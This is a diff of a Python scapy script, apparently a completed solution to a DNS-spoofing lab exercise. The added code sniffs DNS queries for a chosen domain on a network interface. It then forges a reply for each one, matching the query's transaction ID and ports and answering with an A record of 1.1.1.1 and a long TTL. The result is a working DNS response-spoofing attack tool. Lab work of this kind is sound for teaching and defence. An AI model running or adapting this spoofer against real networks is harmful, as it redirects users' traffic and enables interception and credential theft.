@@ -1,18 +1,37 @@
 #!/usr/bin/env python3
-from scapy.all import *
 import sys
+from typing import final
 
-NS_NAME = "example.com"
+from scapy.all import PacketList, send, sniff
+from scapy.layers.dns import DNS, DNSRR
+from scapy.layers.inet import IP, UDP
 
-def spoof_dns(pkt):
-if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode("utf-8")):
-    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
-    ip = IP(...) # Create an IP object
-    udp = UDP(...) # Create a UPD object
-    Anssec = DNSRR(...) # Create an answer record
-    dns = DNS(...) # Create a DNS object
-    spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
-    send(spoofpkt)
 
-    myFilter = "..." # Set the filter
-    pkt=sniff(iface="br-43d947d991eb", filter=myFilter, prn=spoof_dns)
+@final
+class Spoofer:
+    def __init__(self, ns_name: str, if_name: str, filter: str) -> None:
+        self.ns_name = ns_name
+        self.if_name = if_name
+        self.filter = filter
+
+    def spoof_dns(self, pkt: PacketList):
+        if DNS in pkt and self.ns_name in pkt[DNS].qd.qname.decode("utf-8"):
+            print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
+            # Creates an IP object, this is our spoofed answer.
+            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+            # Create a UDP object, spoofed answer UDP "part", since
+            # DNS works over UDP (also TCP but we don't care about it now).
+            udp = UDP(dport=pkt[UDP].sport, sport=53)
+            # Create an answer record, DNS answer section.
+            # rr = resource record
+            Anssec = DNSRR(
+                type="A", ttl=259200, rrname=pkt[DNS].qd.qname, rdata="1.1.1.1"
+            )
+            # Create a DNS object
+            dns = DNS(id=pkt[DNS].id, an=Anssec)
+            # Assemble the spoofed DNS packet
+            spoofpkt = ip / udp / dns
+            _ = send(spoofpkt)
+
+    def spoof(self) -> None:
+        sniff(iface=self.if_name, filter=self.filter, prn=self.spoof_dns)
